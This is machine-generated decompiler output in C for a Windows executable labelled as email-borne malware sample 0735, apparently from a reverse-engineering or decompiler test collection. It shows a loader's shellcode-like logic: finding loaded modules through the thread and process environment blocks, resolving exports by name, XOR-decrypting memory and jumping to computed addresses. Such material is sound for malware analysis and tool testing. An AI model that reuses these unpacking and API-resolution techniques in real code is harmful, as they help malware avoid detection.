// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0735/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401050(word32 ebp, selector fs)
{
	word32 ebx_10 = Mem0[fs:0x00000018:word32];
	word32 edx_15 = fn00401170(ebx_10 + 0x00000C00);
	Mem20[fp + 0xFFFFE3B5 + edx_15:word32] = edx_15;
	word32 eax_27 = 0x01216850 - (edx_15 << 0x0000000B) & 0x00E05800 - (edx_15 << 0x0000000B);
	word32 edx_36 = fp + 0xFFFFE3C1 + dwLoc20;
	Mem37[edx_36 + 0x00000000:word32] = (eax_27 + 0xFFC7CA4C)[edx_15 * 0x00000200] - 0x00000028;
	word32 eax_41 = eax_27 + Mem37[((eax_27 + 0xFFC7CA4C) + (edx_15 << 0x00000009)) - 0x00000004:word32] + 0x00001C53 - dwLoc20;
	Mem45[fp - 0x0000005C:word32] = dwLoc20;
	word32 esi_47;
	word32 ecx_48 = fn00401220(dwArg00, out esi_47);
	Mem52[fp - 0x0000005C:word32] = fp - 0x00000008;
	Mem54[fp - 0x00000060:word32] = 0x00000004;
	Mem56[fp - 0x00000064:word32] = ecx_48;
	Mem58[fp - 0x00000068:word32] = esi_47;
	fn004011B0(dwLoc20, ebx_10, ebp);
	Mem61[fp - 0x0000006C:word32] = dwLoc20;
	Mem67[fp - 0x00000070:word32] = dwLoc14;
	Mem69[fp - 0x00000074:word32] = eax_41;
	(dwLoc20 + 0x003FF4E5)();
	Mem84[fp - 0x00000078:word32] = 0x00000000;
	word32 v15_81 = eax_41 + 0x00001C5B - dwLoc20;
	Mem89[fp - 0x0000007C:word32] = v15_81 + 0x00000BCA;
	v15_81();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	int3();
	Mem91[fp - 0x00000080:word32] = fp - 0x00000004;
	word32 edx_95 = Mem91[fp - 0x00000070:word32];
	word32 ecx_114 = Mem91[fp + 0xFFFFE361 + edx_95:word32];
	word32 ebx_100 = (fp + 0xFFFF8EDC)[edx_95 * 0x00000004];
	Mem102[fp - 0x0000008C:word32] = 0x07B67D4D;
	word32 eax_105 = Mem102[fp - 0x0000008C:word32] - (edx_95 << 0x00000002);
	Mem107[fp - 0x0000008C:word32] = 0x0DBC8BEB;
	Mem108[fp - 0x00000084:word32] = 0x00000001;
	Mem109[fp - 0x00000088:word32] = Mem108[fp - 0x0000008C:word32];
	Mem112[fp - 0x00000088:word32] = Mem109[fp - 0x00000088:word32] + (edx_95 << 0x00000002);
	Mem119[ebx_100 + 0x00000000:word32] = Mem112[ebx_100 + 0x00000000:word32] ^ eax_105;
	ecx_114 = ecx_114 - 0x00000004;
	while (ecx_114 > 0x00000000)
	{
		eax_105 = eax_105 + Mem119[fp - 0x00000088:word32] + Mem119[fp - 0x00000084:word32];
		ebx_100 = ebx_100 + 0x00001C2F - Mem119[fp - 0x00000070:word32];
		Mem129[fp - 0x00000084:word32] = -Mem119[fp - 0x00000084:word32];
		Mem119[ebx_100 + 0x00000000:word32] = Mem112[ebx_100 + 0x00000000:word32] ^ eax_105;
		ecx_114 = ecx_114 - 0x00000004;
	}
	return;
}

word32 fn00401170(word32 esi)
{
	word32 eax_8 = Mem0[0x00401004:word32] + 0xFFFFFFFF;
	if (Mem0[eax_8 + 0x00000000:byte] != 0x90)
		;
	eax_8();
	return Mem0[esi + 0xFFFFFFF4:word32] - 0xBFFFE3DD;
}

void fn004011B0(word32 ecx, word32 edi, word32 dwArg00)
{
	word32 eax_4 = fn004011C0(ecx, edi);
	fn004011E0(eax_4);
	eax_4();
	return;
}

word32 fn004011C0(word32 ecx, word32 edi)
{
	return Mem0[Mem0[Mem0[Mem0[(edi + 0xFFFFC7DA)[ecx * 0x00000002] + 0x0000000C:word32] + 0x0000001C:word32]:word32] + 0x00000008:word32];
}

void fn004011E0(word32 eax)
{
	word32 esi_11 = Mem0[Mem0[Mem0[eax + 0x0000003C:word32] + eax + 0x00000078:word32] + eax + 0x00000020:word32] + eax;
	word32 edx_15 = 0x00000000;
	while (Mem0[Mem0[esi_11 + edx_15:word32] + eax + 0x0000000C:word32] != 0x56007463)
		edx_15 = edx_15 + 0x00000004;
	return;
}

word32 fn00401220(word32 dwArg04, ptr32 esiOut)
{
	word32 eax_14 = (dwArg04 << 0x0000000B) + 0xFF5EBA20 & 0x006FAC00 - (dwArg04 << 0x0000000A);
	word32 eax_18 = eax_14 + 0x00E1583C - (dwArg04 << 0x0000000B);
	word32 esi_15;
	*esiOut = eax_14;
	return Mem0[Mem0[eax_18 + 0x00000000:word32] + 0x00000014 + eax_18:word32];
}

